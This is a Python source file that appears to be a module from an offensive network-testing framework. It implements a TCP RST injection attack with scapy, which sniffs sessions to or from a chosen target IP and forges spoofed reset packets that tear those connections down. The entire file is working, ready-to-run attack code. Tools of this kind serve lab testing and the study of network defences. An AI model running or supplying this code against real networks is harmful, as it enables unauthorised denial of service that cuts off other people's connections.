import random, threading, time
from scapy.all import Ether, IP, TCP, sendp, get_if_hwaddr, sniff
from attacks.base import BaseAttack


class RstInjection(BaseAttack):
    """
    Passive-then-active RST injection.
    Sniffs for active TCP connections to/from the target,
    then injects forged RST packets to tear them down.
    """
    def run(self):
        target_ip = self.params.get("target_ip", "")
        if not target_ip:
            self.log("RST Injection: no target IP", "error"); return

        src_mac = get_if_hwaddr(self.iface)
        writer  = self.open_pcap()
        sent    = [0]
        lock    = threading.Lock()

        self.log(f"RST Injection: sniffing connections to/from {target_ip} …", "warn")
        self.log("  Will inject RST into any active TCP sessions seen", "info")

        def handle(pkt):
            if self._stop.is_set():
                return
            if not (pkt.haslayer(IP) and pkt.haslayer(TCP)):
                return
            ip  = pkt[IP]
            tcp = pkt[TCP]
            # Only inject on established data (PSH or ACK, not SYN/FIN/RST)
            if tcp.flags & 0x04:   # already RST
                return
            if not (tcp.flags & 0x10):  # need ACK set
                return

            # Forge RST from server side
            dst_mac = self.resolve_mac(ip.src)
            rst = (
                Ether(src=src_mac, dst=dst_mac)
                / IP(src=ip.dst, dst=ip.src, ttl=64)
                / TCP(sport=tcp.dport, dport=tcp.sport,
                      flags="R", seq=tcp.ack)
            )
            try:
                sendp(rst, iface=self.iface, verbose=False)
                with lock:
                    self.write(rst)
                    sent[0] += 1
                self.log(
                    f"  RST injected: {ip.dst}:{tcp.dport} → {ip.src}:{tcp.sport}  "
                    f"(seq={tcp.ack})", "warn"
                )
            except Exception as e:
                self.log(f"RST send error: {e}", "error")

        sniff(
            iface=self.iface,
            filter=f"tcp and host {target_ip}",
            prn=handle,
            store=False,
            stop_filter=lambda _: self._stop.is_set(),
        )
        writer.close()
        self.log(f"RST Injection stopped — {sent[0]} RSTs injected", "success")
